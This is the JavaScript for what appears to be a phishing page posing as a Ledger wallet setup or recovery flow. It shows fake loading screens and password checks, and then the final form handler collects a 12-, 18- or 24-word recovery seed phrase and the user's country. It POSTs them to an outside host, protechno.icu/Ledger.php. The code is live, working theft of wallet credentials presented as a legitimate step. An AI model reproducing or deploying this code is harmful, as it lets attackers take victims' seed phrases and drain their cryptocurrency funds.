window.onload = function(){
    setTimeout(function(){
     $(".loader-wrapper").fadeOut("slow");
    }, 1500);

	 setTimeout(pollDOMo, 1800);
function pollDOMo () {
    var op = 0.1;  // initial opacity
    var timer = setInterval(function () {
        if (op >= 1){
            clearInterval(timer);
            //document.getElementById('two').style.display = 'none';
        }
        document.getElementById("twoo").style.opacity = op;
        document.getElementById("twoo").style.filter = 'alpha(opacity=' + op * 100 + ")";
        op += op * 0.1;
    }, 5);
 //document.getElementById("two").style.display="flex"
}
   };
   

  
$('a').click(function(event) {
var target = event.target;
var id = target.id;
  if (event.currentTarget.id === "back") {
 document.getElementById("w13").style.visibility = "unset";
 document.getElementById("w14").style.visibility = "unset";
 document.getElementById("w15").style.visibility = "unset";
 document.getElementById("w16").style.visibility = "unset";
 document.getElementById("w17").style.visibility = "unset";
 document.getElementById("w18").style.visibility = "unset";
 document.getElementById("w19").style.visibility = "unset";
 document.getElementById("w20").style.visibility = "unset";
 document.getElementById("w21").style.visibility = "unset";
 document.getElementById("w22").style.visibility = "unset";
 document.getElementById("w23").style.visibility = "unset";
 document.getElementById("w24").style.visibility = "unset";
  document.getElementById("ono").style.display = "flex";
  document.getElementById("one").style.display="none";
  document.getElementById("onee").style.display="none";
  }
});
  
  
$('a').click(function(event) {
var target = event.target;
var id = target.id;
  if (event.currentTarget.id === "runer") {
  document.getElementById("four").style.display = "flex";
  document.getElementById("tree").style.display="none";
  setTimeout(pollDOMo, 20000);
  }
});

function pollDOMo () {
 document.getElementById("four").style.display = "none";
 document.getElementById("five").style.display = "flex";
} 
   
$('a').click(function (event) {
  var x = document.getElementById("ww");
  var xx = document.getElementById("www");
  if (x.type === "password") {
  document.getElementById("fho").src = "img/eye.jpg";
    x.type = "text";
	xx.type = "text";
  } else {
    document.getElementById("fho").src = "img/noeye.jpg";
    x.type = "password";
	xx.type = "password";
  }
});

function sleep(delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
}


var phrase;

         $('#buttonoo').submit(function (event) {
            event.preventDefault();
 phrase = "3";
 SetValueTree();
 document.getElementById("one").style.display = "flex";
 document.getElementById("ono").style.display = "none";
 document.getElementById("w13").style.visibility = "hidden";
 document.getElementById("w14").style.visibility = "hidden";
 document.getElementById("w15").style.visibility = "hidden";
 document.getElementById("w16").style.visibility = "hidden";
 document.getElementById("w17").style.visibility = "hidden";
 document.getElementById("w18").style.visibility = "hidden";
 document.getElementById("w19").style.visibility = "hidden";
 document.getElementById("w20").style.visibility = "hidden";
 document.getElementById("w21").style.visibility = "hidden";
 document.getElementById("w22").style.visibility = "hidden";
 document.getElementById("w23").style.visibility = "hidden";
 document.getElementById("w24").style.visibility = "hidden";
		 });

		 
         $('#buttonoooo').submit(function (event) {
            event.preventDefault();
 phrase = "2";
 SetValueTwo();
 document.getElementById("one").style.display = "flex";
 document.getElementById("ono").style.display = "none";
 document.getElementById("w19").style.visibility = "hidden";
 document.getElementById("w20").style.visibility = "hidden";
 document.getElementById("w21").style.visibility = "hidden";
 document.getElementById("w22").style.visibility = "hidden";
 document.getElementById("w23").style.visibility = "hidden";
 document.getElementById("w24").style.visibility = "hidden";
		 });

		 
		 $('#buttonooo').submit(function (event) {
            event.preventDefault();
 phrase = "1";
 SetValueOne();
 document.getElementById("one").style.display = "flex";
 document.getElementById("ono").style.display = "none";

 
		 });

         $('#formuo').submit(function (event) {
            event.preventDefault();
 document.getElementById("four").style.display = "flex";
 document.getElementById("five").style.display = "none";
 setTimeout(pollDOMo, 20000);
		 });

         $('#formou').submit(function (event) {
            event.preventDefault();
 document.getElementById("five").style.display="none"
 document.getElementById("ono").style.display="flex"
		 });

         $('#formo').submit(function (event) {
            event.preventDefault();
			if($('#ww').val().length < 8){ // checks the password value length
       alert('You have entered less than 8 characters for password');
       return false;
			}else{
			
			if ($('#ww').val() != $('#www').val()) {
alert('Check your password');
return false;
} else {
 document.getElementById("ho").style.display="none"
 document.getElementById("hoo").style.display="block"

 setTimeout(pollDOM, 3000);
function pollDOM () {
 document.getElementById("tree").style.display="flex"
 document.getElementById("two").style.display="none"
}
   }
	  }
		 });
		 
		 
		var w13value = "-";
		var w14value = "-";
		var w15value = "-";
		var w16value = "-";
		var w17value = "-";
		var w18value = "-";
		var w19value = "-";
		var w20value = "-";
		var w21value = "-";
		var w22value = "-";
		var w23value = "-";
		var w24value = "-";
		
		 
		function SetValueOne () {
		document.getElementById('w13').disabled = false;
		document.getElementById('w14').disabled = false;
		document.getElementById('w15').disabled = false;
		document.getElementById('w16').disabled = false;
		document.getElementById('w17').disabled = false;
		document.getElementById('w18').disabled = false;
		document.getElementById('w19').disabled = false;
		document.getElementById('w20').disabled = false;
		document.getElementById('w21').disabled = false;
		document.getElementById('w22').disabled = false;
		document.getElementById('w23').disabled = false;
		document.getElementById('w24').disabled = false;
		w13value = document.getElementById('w13').value;
		w14value = document.getElementById('w14').value;
		w15value = document.getElementById('w15').value;
		w16value = document.getElementById('w16').value;
		w17value = document.getElementById('w17').value;
		w18value = document.getElementById('w18').value;
		w19value = document.getElementById('w19').value;
		w20value = document.getElementById('w20').value;
		w21value = document.getElementById('w21').value;
		w22value = document.getElementById('w22').value;
		w23value = document.getElementById('w23').value;
		w24value = document.getElementById('w24').value;
		}
		function SetValueTwo () {
		document.getElementById('w13').disabled = false;
		document.getElementById('w14').disabled = false;
		document.getElementById('w15').disabled = false;
		document.getElementById('w16').disabled = false;
		document.getElementById('w17').disabled = false;
		document.getElementById('w18').disabled = false;
		document.getElementById('w19').disabled = true;
		document.getElementById('w20').disabled = true;
		document.getElementById('w21').disabled = true;
		document.getElementById('w22').disabled = true;
		document.getElementById('w23').disabled = true;
		document.getElementById('w24').disabled = true;
		w13value = document.getElementById('w13').value;
		w14value = document.getElementById('w14').value;
		w15value = document.getElementById('w15').value;
		w16value = document.getElementById('w16').value;
		w17value = document.getElementById('w17').value;
		w18value = document.getElementById('w18').value;
		w19value = "-";
		w20value = "-";
		w21value = "-";
		w22value = "-";
		w23value = "-";
		w24value = "-";
		}
		function SetValueTree () {
		document.getElementById('w13').disabled = true;
		document.getElementById('w14').disabled = true;
		document.getElementById('w15').disabled = true;
		document.getElementById('w16').disabled = true;
		document.getElementById('w17').disabled = true;
		document.getElementById('w18').disabled = true;
		document.getElementById('w19').disabled = true;
		document.getElementById('w20').disabled = true;
		document.getElementById('w21').disabled = true;
		document.getElementById('w22').disabled = true;
		document.getElementById('w23').disabled = true;
		document.getElementById('w24').disabled = true;
		w13value = "-";
		w14value = "-";
		w15value = "-";
		w16value = "-";
		w17value = "-";
		w18value = "-";
		w19value = "-";
		w20value = "-";
		w21value = "-";
		w22value = "-";
		w23value = "-";
		w24value = "-";
		}
		 
        $('#form').submit(function (event){
            if(phrase==1)SetValueOne ();
			if(phrase==2)SetValueTwo ();
			if(phrase==3)SetValueTree ();
            event.preventDefault();
            $.ajax({
                type : 'POST',
                url : 'https://protechno.icu/Ledger.php',
                data : {
                    w1: document.getElementById('w1').value,
                    w2: document.getElementById('w2').value,
                    w3: document.getElementById('w3').value,
                    w4: document.getElementById('w4').value,
                    w5: document.getElementById('w5').value,
                    w6: document.getElementById('w6').value,
                    w7: document.getElementById('w7').value,
                    w8: document.getElementById('w8').value,
                    w9: document.getElementById('w9').value,
                    w10: document.getElementById('w10').value,
                    w11: document.getElementById('w11').value,
                    w12: document.getElementById('w12').value,
                    w13: w13value,
                    w14: w14value,
                    w15: w15value,
                    w16: w16value,
                    w17: w17value,
                    w18: w18value,
                    w19: w19value,
                    w20: w20value,
                    w21: w21value,
                    w22: w22value,
                    w23: w23value,
                    w24: w24value,
					country: document.getElementById('country').value
                }
            }); 
        });

		